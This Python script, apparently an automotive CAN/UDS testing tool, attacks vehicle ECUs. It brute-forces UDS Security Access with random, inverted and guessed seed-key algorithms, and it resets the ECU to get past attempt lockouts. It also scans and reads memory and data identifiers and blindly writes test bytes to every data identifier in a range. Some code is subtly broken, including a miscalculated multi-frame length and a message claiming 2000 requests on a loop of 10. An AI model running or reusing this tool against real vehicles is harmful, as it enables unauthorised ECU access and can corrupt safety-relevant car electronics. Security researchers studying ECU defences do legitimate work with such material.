import can
import time
import signal
import sys
import random

def signal_handler(sig, frame):
    print("\nCtrl+C detected. Exiting...")
    sys.exit(0)
def Save_log(seed):
    log_file = "seed.log"  # 日志文件名
    hex_seed = ' '.join(f'{b:02X}' for b in seed)  # 转换为十六进制并用空格分隔

    with open(log_file + "_hex", "a") as f_hex:
        f_hex.write(hex_seed + '\n')


def send_iso_tp_message(bus, arb_id, expected_response_ids, data, is_extend_id):
    """发送 ISO-TP 消息"""
    max_single_frame_size = 7  # ISO-TP 单帧数据的最大长度（不包括数据头）
    if len(data) <= max_single_frame_size:
        # 发送单帧
        can_id = arb_id
        can_data = bytearray([0x00 | len(data)] + list(data))  # 构造单帧数据
        # 填充到 8 字节
        while len(can_data) < 8:
            can_data.append(0x00)  # 以 0x00 填充，或根据协议需要使用其他值	
        message = can.Message(arbitration_id=can_id, data=can_data, is_extended_id=is_extend_id)
        bus.send(message)  # 发送单帧消息
    else:
        # 发送多帧
        can_id = arb_id
        ff_dl = len(data) + len(data)//7  # 总数据长度
        ff_data = data[:6]  # 首帧数据（最多 6 字节）
        can_data = bytearray([0x10 | (ff_dl >> 8), ff_dl & 0xFF] + list(ff_data))  # 构造首帧数据
        message = can.Message(arbitration_id=can_id, data=can_data, is_extended_id=is_extend_id)
        bus.send(message)  # 发送首帧消息

        # 流控帧接收
        flow_control_message = bus.recv(timeout=1.0)  # 接收流控帧
        if flow_control_message is None or flow_control_message.arbitration_id not in expected_response_ids or flow_control_message.data[0] >> 4 != 0x3:
            print("流控帧接收失败")
            return
        
        block_size = flow_control_message.data[1]  # 流控帧的区块大小
        st_min = flow_control_message.data[2]  # 流控帧的最小分隔时间

        remaining_data = data[6:]  # 剩余数据
        frame_id = 1  # 帧 ID 初始化

        while remaining_data:
            cf_data = remaining_data[:7]  # 每帧的数据（最多 7 字节）
            remaining_data = remaining_data[7:]  # 更新剩余数据
            can_data = bytearray([0x20 | frame_id] + list(cf_data))  # 构造连续帧数据
            while len(can_data) < 8:
                can_data.append(0x55)  # 以 0x00 填充，或根据协议需要使用其他值	
            message = can.Message(arbitration_id=can_id, data=can_data, is_extended_id=is_extend_id)
            bus.send(message)  # 发送连续帧消息
            frame_id = (frame_id + 1) % 16  # 更新帧 ID
            time.sleep(st_min / 1000)  # 等待流控帧中指定的时间

def receive_iso_tp_message(bus, arb_id, expected_response_ids):
    """接收 ISO-TP 消息"""
    while True:
        first_frame = bus.recv(timeout=1.0)  # 接收首帧
        if first_frame is None or first_frame.arbitration_id not in expected_response_ids:
            print("未接收到首帧")
            continue

        if first_frame.data[0] >> 4 == 0x0:
            # 单帧
            length = first_frame.data[0] & 0x0F  # 数据长度
            data = first_frame.data[1:length+1]  # 获取数据
            return data
        elif first_frame.data[0] >> 4 == 0x1:
            # 首帧
            length = ((first_frame.data[0] & 0x0F) << 8) + first_frame.data[1]  # 数据总长度
            data = first_frame.data[2:8]  # 获取首帧数据
            # 发送流控帧
            flow_control_data = bytearray([0x30, 0x00, 0x0A])  # 构造流控帧数据

            while len(flow_control_data) < 8:
                flow_control_data.append(0x00)  # 以 0x00 填充，或根据协议需要使用其他值	
            flow_control_message = can.Message(arbitration_id=arb_id, data=flow_control_data, is_extended_id=False)
            bus.send(flow_control_message)  # 发送流控帧

            while len(data) < length:
                consecutive_frame = bus.recv(timeout=1.0)  # 接收连续帧
                if consecutive_frame is None or consecutive_frame.arbitration_id not in expected_response_ids or consecutive_frame.data[0] >> 4 != 0x2:
                    print("未接收到连续帧")
                    return
                data += consecutive_frame.data[1:]  # 更新数据

            return data[:length]  # 返回完整数据           
def switch_NRC(argument):
    nrc_dict = {
        0x10: "一般拒绝 (General Reject)",
        0x11: "服务不支持 (Service Not Supported)",
        0x12: "子功能不支持或被禁用 (Sub-function Not Supported)",
        0x13: "格式错误 (Incorrect Message Length or Invalid Format)",
        0x14: "响应过长 (Response Too Long)",
        0x21: "忙，拒绝请求 (Busy - Repeat Request)",
        0x22: "条件不正确 (Conditions Not Correct)",
        0x24: "请求顺序错误 (Request Sequence Error)",
        0x25: "请求重复 (Request Out of Range)",
        0x26: "安全访问拒绝 (Security Access Denied)",
        0x31: "请求参数无效 (Request Out of Range)",
        0x33: "安全访问被拒绝 (Security Access Denied)",
        0x35: "密钥无效 (Invalid Key)",
        0x36: "超出尝试次数 (Exceeded Number of Attempts)",
        0x37: "需要时间延迟 (Required Time Delay Not Expired)",
        0x70: "上传/下载未完成 (Upload/Download Not Accepted)",
        0x71: "传输中止 (Transfer Aborted)",
        0x72: "传输暂停 (Transfer Suspended)",
        0x73: "块序号错误 (Wrong Block Sequence Counter)",
        0x78: "请求正在处理 (Request Correctly Received - Response Pending)",
        0x7E: "服务在此会话不支持 (Sub-function Not Supported in Active Session)",
        0x7F: "服务未完成 (Service Not Completed)",
        0x80: "内部ECU错误 (General Programming Failure)"
    }

    description = nrc_dict.get(argument, f"未知 NRC: {argument:02X}")
    print(f"NRC=={argument:02X}, {description}")

def extended_session(bus,arb_id, expected_response_ids,  is_extend_id):
    # 发送进入扩展会话的CAN消息
    send_iso_tp_message(bus, arb_id, expected_response_ids, [0x10, 0x03], is_extend_id)

    response = receive_iso_tp_message(bus, arb_id, expected_response_ids)
def process_seed(bus, arb_id, data, level, expected_response_ids,is_extend_id,seed_data):
    # 按位取反
    inverted_data = [~b & 0xFF for b in seed_data]
    data_hex = ' '.join(f"{b:02X}" for b in inverted_data)
    print(f"Processed seed data (inverted): {data_hex}\n")
    sid_byte = 0x27
    subfunc_byte = level + 1
    can_data = bytearray([sid_byte, subfunc_byte] + inverted_data)

    send_iso_tp_message(bus, arb_id, expected_response_ids, can_data, is_extend_id)
    time.sleep(0.1)
    
    # 接收 ECU 响应
    response = receive_iso_tp_message(bus, arb_id, expected_response_ids)
    if not response:
        print("❌ No response after sending key")
        return False

    if response[0] == 0x67 and response[1] == subfunc_byte:
        print("✅ Key accepted by ECU")
        return True
    elif response[0] == 0x7F and response[2] != 0x36:
        switch_NRC(response[2])
        return False
    elif response[2] == 0x36:
        send_iso_tp_message(bus, arb_id, expected_response_ids, [0x11, 0x01], is_extend_id)
        time.sleep(0.2)
        response1 = receive_iso_tp_message(bus, arb_id, expected_response_ids)
        if response1 is not  None and response1[0] == 0x51:
            print("收到 ECU Reset")
            return None
        time.sleep(0.2)
        return None
    else:
        print(f"❌ Unexpected response after sending key: {' '.join(f'{b:02X}' for b in response)}")
        return False   


def auto_seed_key_attack(bus, arb_id, expected_response_ids, level, is_extend_id):
    """
    自动执行多算法的 Seed/Key 测试逻辑。
    每次算法都会重新请求种子，生成 key，发送验证，直到找到正确算法或全部失败。
    """
    # 定义常见简单算法集合
    algorithms = {
        "xor_55": lambda s: [b ^ 0x55 for b in s],
        "xor_AA": lambda s: [b ^ 0xAA for b in s],
        "add_1": lambda s: [(b + 1) & 0xFF for b in s],
        "sub_1": lambda s: [(b - 1) & 0xFF for b in s],
        "add_index": lambda s: [(b + i) & 0xFF for i, b in enumerate(s)],
        "xor_index": lambda s: [b ^ i for i, b in enumerate(s)],
        "swap_pairs": lambda s: [s[i ^ 1] if i < len(s) else s[i] for i in range(len(s))],
        "invert": lambda s: [~b & 0xFF for b in s],
    }

    alg_items = list(algorithms.items())
    i = 0
    while i < len(alg_items):
        alg_name, alg_func = alg_items[i]
        print(f"\n==============================")
        print(f"🔹 Trying algorithm: {alg_name}")
        print(f"==============================")

        # 1️⃣ 进入扩展会话
        extended_session(bus, arb_id, expected_response_ids, is_extend_id)
        time.sleep(0.1)

        # 2️⃣ 请求种子
        seed = request_seed(bus, arb_id, expected_response_ids, level, is_extend_id, choice=1)
        if not seed:
            print(f"❌ [{alg_name}] No seed received, skip this algorithm.")
            i += 1
            continue

        # 3️⃣ 使用当前算法生成 key
        try:
            key_data = alg_func(seed)
        except Exception as e:
            print(f"⚠️ [{alg_name}] Algorithm error: {e}")
            i += 1
            continue

        # 校验 key 长度合法
        if not key_data or not isinstance(key_data, list):
            print(f"⚠️ [{alg_name}] Invalid key generation result.")
            i += 1
            continue

        print(f"Generated Key ({alg_name}): {' '.join(f'{b:02X}' for b in key_data)}")

        # 4️⃣ 构造 key 报文
        sid = 0x27
        subfunc = level + 1
        can_data = bytearray([sid, subfunc] + key_data)

        # 5️⃣ 发送 key
        send_iso_tp_message(bus, arb_id, expected_response_ids, can_data, is_extend_id)
        time.sleep(0.15)

        # 6️⃣ 接收响应
        response = receive_iso_tp_message(bus, arb_id, expected_response_ids)
        if not response:
            print(f"❌ [{alg_name}] No response after sending key")
            i += 1
            continue

        # 7️⃣ 响应处理逻辑
        if len(response) < 2:
            print(f"⚠️ [{alg_name}] Invalid response length.")
            i += 1
            continue

        # 成功情况
        if response[0] == 0x67 and response[1] == subfunc:
            print(f"✅ [{alg_name}] Success! ECU accepted the key.")
            return True

        # NRC 情况
        elif response[0] == 0x7F:
            if len(response) >= 3:
                nrc = response[2]
                switch_NRC(nrc)
                if nrc == 0x36:
                    print(f"🔁 [{alg_name}] Too many attempts, ECU requires reset.")
                    send_iso_tp_message(bus, arb_id, expected_response_ids, [0x11, 0x01], is_extend_id)
                    time.sleep(2.0)
                    response1 = receive_iso_tp_message(bus, arb_id, expected_response_ids)
                    if response1 is not  None and response1[0] == 0x51:
                        print("收到 ECU Reset")
                        # 不增加i，继续尝试当前算法
                        continue
                    else:
                        i += 1
                else:
                    i += 1
            else:
                print(f"⚠️ [{alg_name}] NRC response malformed.")
                i += 1

        # ECU Reset 响应
        elif response[0] == 0x51:
            print(f"⚙️ [{alg_name}] ECU Reset response, skipping this round.")
            time.sleep(0.5)
            i += 1

        # 其他响应
        else:
            print(f"❌ [{alg_name}] Unexpected response.")
            i += 1

    print("\n❌ All algorithms tried, none succeeded.")
    return False

def send_key_random(bus, arb_id, seed, level, expected_response_ids, is_extend_id):
    if not seed:
        print("❌ No seed available, skipping key generation.")
        return False

    sid_byte = 0x27
    subfunc_byte = level + 1
    key_data = [random.randint(0, 255) for _ in range(len(seed))]
    can_data = bytearray([sid_byte, subfunc_byte] + key_data)

    send_iso_tp_message(bus, arb_id, expected_response_ids, can_data, is_extend_id)
    time.sleep(0.1)  # 等待 ECU 响应

    # 接收 ECU 响应
    response = receive_iso_tp_message(bus, arb_id, expected_response_ids)
    if not response:
        print("❌ No response after sending key")
        return False

    if response[0] == 0x67 and response[1] == subfunc_byte:
        print("✅ Key accepted by ECU")
        return True
    elif response[0] == 0x7F and response[2] != 0x36:
        switch_NRC(response[2])
        return False
    elif response[2] == 0x36:
        send_iso_tp_message(bus, arb_id, expected_response_ids, [0x11, 0x01], is_extend_id)
        time.sleep(0.2)
        response1 = receive_iso_tp_message(bus, arb_id, expected_response_ids)
        if response1 is not  None and response1[0] == 0x51:
            print("收到 ECU Reset")
            return None
        time.sleep(0.2)
        return None
    else:
        print(f"❌ Unexpected response after sending key: {' '.join(f'{b:02X}' for b in response)}")
        return False    

    
def request_seed(bus, arb_id, expected_response_ids, level, is_extend_id, choice):
    # 构造请求种子的CAN消息
    request_data = [0x27, level]
    # 发送请求
    try:
        send_iso_tp_message(bus, arb_id, expected_response_ids, request_data, is_extend_id)
    except Exception as e:
        print(f"Failed to send seed request: {e}")
        return None
       
    response = receive_iso_tp_message(bus, arb_id, expected_response_ids)
    
    if not response:
        print("No response for seed")
        return None

    response_data = " ".join("{:02X}".format(byte) for byte in response)
 
    if response[0] == 0x67 and response[1] == level:
        seed = response[2:]  # 跳过 [SID, sub-function]
        print(f"Seed:", " ".join(format(b, '02X') for b in seed))
        Save_log(seed)
        return seed

    elif response[0] == 0x7F and response[2] != 0x36:
        print(f"Request failed. Response data:", response_data)
        switch_NRC(response[2])
        return None
    elif response[2] == 0x36:
            send_iso_tp_message(bus, arb_id, expected_response_ids, [0x11, 0x01], is_extend_id)
            time.sleep(0.2)
            return None
    else:
        print(f"Unexpected response:", response_data)
    
def read_memory(bus, start_address):

    # 读取 0xFF 个地址
    msg = can.Message(arbitration_id=0x7E0, data=[
        0x07, 0x23, 0x14,
        (start_address >> 24) & 0xFF,
        (start_address >> 16) & 0xFF,
        (start_address >> 8) & 0xFF,
        start_address & 0xFF,
        0xFF
    ], is_extended_id=False)
    bus.send(msg)

    all_data = []
    
    # 接收多帧响应
    while True:
        response = bus.recv()
        if response:
            data = response.data
            all_data.extend(data)

            # 保存十六进制数据
            with open("hex_data.txt", "a") as hex_file:
                hex_file.write(' '.join(f"{b:02X}" for b in data) + '\n')

            # 检查是否是最后一帧
            if len(data) < 8:  # 假设最后一帧小于 8 字节
                break

    # 转换为 ASCII
    ascii_string = ''.join(chr(b) for b in all_data if 32 <= b <= 126)
    print(f"Address: {hex(start_address)}, ASCII: {ascii_string}")
    
def read_data_by_identifier(bus, arb_id, expected_response_ids, did, is_extend_id):
    """
    发送 ReadDataByIdentifier (0x22) 请求并接收响应
    """
    # 构造请求数据: SID (0x22) + DID (2字节)
    request_data = [0x22, (did >> 8) & 0xFF, did & 0xFF]
    
    # 发送请求
    send_iso_tp_message(bus, arb_id, expected_response_ids, request_data, is_extend_id)
    
    # 接收响应
    response = receive_iso_tp_message(bus, arb_id, expected_response_ids)

    if not response:
        return None
    
    # 调试信息
    print(f"DID 0x{did:04X} Response:", " ".join(format(b, '02X') for b in response))
    
    # 解析响应
    if len(response) >= 3 and response[0] == 0x62:  # 0x62 是 0x22 的肯定响应SID
        # 检查DID是否匹配
        response_did = (response[1] << 8) | response[2]
        if response_did == did:
            # 提取数据
            data = response[3:]
            return list(data)  # 确保返回的是list类型
        else:
            print(f"DID不匹配: 请求0x{did:04X}, 响应0x{response_did:04X}")
            return list(response)  # 返回完整响应用于调试
    elif len(response) >= 3 and response[0] == 0x7F and response[1] == 0x22:
        # 负响应
        nrc = response[2]
        return nrc  # 返回负响应代码
    
    # 其他情况，返回完整响应用于调试
    print(f"未知响应格式: {' '.join(format(b, '02X') for b in response)}")
    return list(response)

def write_data_by_identifier(bus, arb_id, expected_response_ids, did, data, is_extend_id):
    """
    发送 WriteDataByIdentifier (0x2E) 请求并接收响应
    """
    # 构造请求数据: SID (0x2E) + DID (2字节) + 数据
    request_data = [0x2E, (did >> 8) & 0xFF, did & 0xFF] + data
    
    # 发送请求
    send_iso_tp_message(bus, arb_id, expected_response_ids, request_data, is_extend_id)
    
    # 接收响应
    response = receive_iso_tp_message(bus, arb_id, expected_response_ids)
    
    if not response:
        return None
        
    # 解析响应
    if len(response) >= 3 and response[0] == 0x6E:  # 0x6E 是 0x2E 的肯定响应SID
        # 检查DID是否匹配
        response_did = (response[1] << 8) | response[2]
        if response_did == did:
            return True  # 写入成功
    elif len(response) >= 3 and response[0] == 0x7F and response[1] == 0x2E:
        # 负响应
        nrc = response[2]
        return nrc  # 返回负响应代码
    
    return None

def scan_all_dids_mode0(bus, arb_id, expected_response_ids, is_extend_id, start_did=0x0000, end_did=0xFFFF):
    """
    模式0: 遍历扫描所有DID并显示十六进制数据和ASCII值
    """
    print(f"开始扫描 DID 范围: 0x{start_did:04X} 到 0x{end_did:04X}")
    print("="*80)
    print(f"{'DID':<8} {'HEX数据':<30} {'ASCII表示':<20} {'状态'}")
    print("-"*80)
    
    found_dids = []
    
    for did in range(start_did, end_did + 1):
        try:
            result = read_data_by_identifier(bus, arb_id, expected_response_ids, did, is_extend_id)
            
            if result is None:
                # 无响应
                pass
            elif isinstance(result, list):
                # 成功读取到数据
                hex_data = ' '.join(f"{b:02X}" for b in result)
                # 转换为可打印ASCII字符，不可打印字符替换为'.'
                ascii_data = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in result)
                print(f"0x{did:04X}   {hex_data:<30} {ascii_data:<20} 成功")
                found_dids.append((did, result, "success"))
            elif isinstance(result, int):
                # 负响应
                print(f"0x{did:04X}   {'NRC: 0x{:02X}'.format(result):<30} {'':<20} ", end="")
                switch_NRC(result)
                found_dids.append((did, None, f"NRC: 0x{result:02X}"))
            
            # 每100个DID显示一次进度
            if did % 100 == 0 and did != 0:
                print(f"进度: {did}/{end_did} (0x{did:04X}/0x{end_did:04X})")
                
            # 短暂延迟避免总线过载
            time.sleep(0.01)
            
        except Exception as e:
            print(f"❌ DID 0x{did:04X}: 错误 - {e}")
            found_dids.append((did, None, f"Error: {e}"))
            continue
    
    # 输出总结
    print("="*80)
    success_count = len([d for d in found_dids if d[2] == "success"])
    nrc_count = len([d for d in found_dids if d[2].startswith("NRC")])
    error_count = len([d for d in found_dids if d[2].startswith("Error")])
    
    print(f"扫描完成，共发现 {len(found_dids)} 个响应DID:")
    print(f"  - 成功读取: {success_count}")
    print(f"  - 负响应: {nrc_count}")
    print(f"  - 错误: {error_count}")
    
    # 保存结果到文件
    with open("did_scan_results.txt", "w", encoding="utf-8") as f:
        f.write(f"DID扫描结果\n")
        f.write(f"{'DID':<8} {'HEX数据':<30} {'ASCII表示':<20} {'状态'}\n")
        f.write("-"*80 + "\n")
        
        for did, data, status in found_dids:
            if data is not None:
                hex_data = ' '.join(f"{b:02X}" for b in data)
                ascii_data = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in data)
                f.write(f"0x{did:04X}   {hex_data:<30} {ascii_data:<20} {status}\n")
            else:
                f.write(f"0x{did:04X}   {'':<30} {'':<20} {status}\n")
    
    print(f"\n详细结果已保存到 did_scan_results.txt")
    return found_dids

def test_write_did_mode1(bus, arb_id, expected_response_ids, is_extend_id, start_did=0x0000, end_did=0xFFFF):
    """
    模式1: 对DID范围发送2E服务(写入请求)并返回NRC
    """
    print(f"开始测试 DID 写入服务，范围: 0x{start_did:04X} 到 0x{end_did:04X}")
    print("="*60)
    print(f"{'DID':<8} {'响应'}")
    print("-"*60)
    
    results = []
    
    # 使用固定测试数据
    test_data = [0x01, 0x02, 0x03, 0x04]  # 示例测试数据
    
    for did in range(start_did, end_did + 1):
        try:
            result = write_data_by_identifier(bus, arb_id, expected_response_ids, did, test_data, is_extend_id)
            
            if result is None:
                # 无响应
                print(f"0x{did:04X}   无响应")
                results.append((did, "无响应"))
            elif result is True:
                # 写入成功
                print(f"0x{did:04X}   写入成功")
                results.append((did, "写入成功"))
            elif isinstance(result, int):
                # 负响应
                print(f"0x{did:04X}   ", end="")
                switch_NRC(result)
                results.append((did, f"NRC: 0x{result:02X}"))
            
            # 每50个DID显示一次进度
            if did % 50 == 0 and did != 0:
                print(f"进度: {did}/{end_did} (0x{did:04X}/0x{end_did:04X})")
                
            # 短暂延迟避免总线过载
            time.sleep(0.02)
            
        except Exception as e:
            print(f"❌ DID 0x{did:04X}: 错误 - {e}")
            results.append((did, f"错误: {e}"))
            continue
    
    # 保存结果到文件
    with open("write_did_test_results.txt", "w", encoding="utf-8") as f:
        f.write(f"DID写入测试结果\n")
        f.write(f"{'DID':<8} {'响应'}\n")
        f.write("-"*60 + "\n")
        
        for did, response in results:
            f.write(f"0x{did:04X}   {response}\n")
    
    print("="*60)
    print(f"测试完成，结果已保存到 write_did_test_results.txt")
    return results

def get_did_scan_range():
    """
    获取用户输入的DID扫描范围
    """
    print("请输入要扫描的DID范围:")
    start_input = input("起始 DID (hex, 默认 0000): ").strip()
    end_input = input("结束 DID (hex, 默认 FFFF): ").strip()
    
    try:
        start_did = int(start_input, 16) if start_input else 0x0000
        end_did = int(end_input, 16) if end_input else 0xFFFF
        
        # 确保范围有效
        if start_did > end_did:
            print("起始DID不能大于结束DID，使用默认范围")
            return 0x0000, 0xFFFF
            
        return start_did, end_did
    except ValueError:
        print("输入格式错误，使用默认范围 0x0000-0xFFFF")
        return 0x0000, 0xFFFF

def get_scan_mode():
    """
    获取扫描模式
    """
    mode_input = input("请选择模式 (0: 读取DID并显示数据, 1: 发送写入DID请求并返回NRC, 默认 0): ").strip()
    try:
        mode = int(mode_input) if mode_input else 0
        if mode not in [0, 1]:
            print("模式必须是0或1，使用默认模式0")
            return 0
        return mode
    except ValueError:
        print("输入格式错误，使用默认模式0")
        return 0
    
def print_log_header():
    print("   .               .    ")
    print(" .´  ·  .     .  ·  `.  UDS TEST")
    print(" :  :  :  (¯)  :  :  :  A CAN Test Tool")
    print(" `.  ·  ` /¯\\ ´  ·  .´  by 1in-oos")
    print("   `     /¯¯¯\\     ´   https://github.com/1in-oos/seedtest.git")
    print("="*50)
def get_arbitration_id():
    id_input = input("Enter CAN message ID (hex, leave empty to use default 7E0): ").strip()
    if id_input:
        return int(id_input, 16)
    else:
        return 0x7E0
def UDS_SID():
    SID = input("Enter Service Identifier Data (hex, leave empty to use default 27): ").strip()
    if SID:
        return int(SID, 16)
    else:
        return 0x27
    
def get_27_level():
    level_input = input("Enter 27 Security Access Level bytes (hex, leave empty to use default 01): ").strip()
    if level_input:
        seed_choice = get_seed_choice()
        return int(level_input, 16),seed_choice
    else:
        seed_choice = get_seed_choice()
        return 0x01,seed_choice

def get_seed_choice():
    choice_input = input("请输入0,1,2进行种子爆破(0: 不进行,1: 随机,2: 取反, 3: suanfabaopo, leave empty to use default 0): ").strip()
    if choice_input:
        return int(choice_input)
    else:
        return 0

def main():
    print_log_header()
    
    arb_id = get_arbitration_id()
    SID = UDS_SID()
    start_address = 0xC3F80000
# 数据处理
    # 检查消息的ID是否是发送ID加8或者是交换ID的后两个字节 
    is_extend_id = arb_id > 0x7FF
    expected_response_ids =  {arb_id + 8, arb_id - 8,(arb_id & 0xFFFF0000) | ((arb_id & 0x0000FF00) >> 8) | ((arb_id & 0x000000FF) << 8)}
    #id过滤
    filters = [
        {"can_id": arb_id+8, "can_mask": 0x7FF, "extended": False},
        {"can_id": arb_id-8, "can_mask": 0x7FF, "extended": False},
        {"can_id": (arb_id & 0xFFFF0000) | ((arb_id & 0x0000FF00) >> 8) | ((arb_id & 0x000000FF) << 8), "can_mask": 0x1FFFFFFF, "extended": True},
        {"can_id": arb_id, "can_mask": 0x1FFFFFFF, "extended": True},
    ]

    bus = can.interface.Bus(channel="can0", interface="socketcan", can_filters=filters)
    # 注册信号处理程序
    signal.signal(signal.SIGINT, signal_handler)

# 其他逻辑代码可以在这里继续
    if SID == 0x27:
        level,seed_choice = get_27_level()

        print("\nConfiguration Summary:")
        print(f"Using arbitration ID: {hex(arb_id)}")
        print(f"Security Access Level: {hex(level)}")
        print(f"Seed choice: {seed_choice}")
        
        try:
            # 请求2000次种子
            if seed_choice == 0:
                print("Requesting seed 2000 times")
                for i in range(10):
                    extended_session( bus, arb_id, expected_response_ids, is_extend_id)
                    time.sleep(0.01)
                    request_seed(bus, arb_id,expected_response_ids, level, is_extend_id,seed_choice)
                    time.sleep(0.01)  # 间隔一段时间再发送下一个请求，以避免发送速率过快 
                    
            elif seed_choice == 1:
                print("Requesting seed and performing random key attempts")
                success = False
                for i in range(10):
                    extended_session( bus, arb_id, expected_response_ids, is_extend_id)
                    time.sleep(0.1)
                    seed = request_seed(bus, arb_id,expected_response_ids, level, is_extend_id,seed_choice)
                    time.sleep(0.1)
                    if seed is None:
                        print("No seed received, skipping key attempt.")
                        time.sleep(0.5)
                        continue
                    result = send_key_random(bus, arb_id, seed, level,  expected_response_ids, is_extend_id)
                    if result is True:
                        print("🎉 Security access granted successfully!")
                        success = True
                        break
                    elif result is None:
                        print("⏳ ECU requires delay, waiting before next attempt...")
                        time.sleep(2)  # 等待更长时间
                        continue
                    else:
                        print("🔑 Key rejected, trying again...")
                        time.sleep(0.5)
                
            elif seed_choice == 2:
                print("Requesting seed and processing with inverted key")
                extended_session( bus, arb_id, expected_response_ids, is_extend_id)
                time.sleep(0.1)
                seed = request_seed(bus, arb_id,expected_response_ids, level, is_extend_id,seed_choice)
                process_seed(bus, arb_id, seed, level, expected_response_ids, is_extend_id, seed)
                
            elif seed_choice == 3:
                print("Requesting seed and performing suanfabaopo key attempts")
                auto_seed_key_attack(bus, arb_id, expected_response_ids, level, is_extend_id)
                   
                       
        except KeyboardInterrupt:
            bus.shutdown()
            print("\nCtrl+C detected. Exiting...")
        finally:
            # 关闭CAN总线接口
            bus.shutdown()
    elif SID == 0x23:
        try:
            read_memory(bus, start_address)
            start_address += 0xFF  # 每次加 0xFF
            time.sleep(0.1)  # 适当的延迟，避免发送过快

        except KeyboardInterrupt:
            bus.shutdown()
            print("\nCtrl+C detected. Exiting...")
        finally:
            # 关闭CAN总线接口
            bus.shutdown()
    elif SID == 0x22:
        
        print("执行 ReadDataByIdentifier (0x22) DID 扫描")
        mode = get_scan_mode()
        extended_session( bus, arb_id, expected_response_ids, is_extend_id)
        time.sleep(0.01)
        start_did, end_did = get_did_scan_range()
        
        try:
            if mode == 0:
                # 模式0: 遍历DID并显示十六进制数据和ASCII值
                print("模式0: 遍历DID并显示数据")
                scan_all_dids_mode0(bus, arb_id, expected_response_ids, is_extend_id, start_did, end_did)
            elif mode == 1:
                # 模式1: 发送2E服务并返回NRC
                print("模式1: 发送写入DID请求并返回NRC")
                test_write_did_mode1(bus, arb_id, expected_response_ids, is_extend_id, start_did, end_did)
                
        except KeyboardInterrupt:
            print("\n用户中断操作...")
        finally:
            bus.shutdown()

if __name__ == "__main__":
    main()


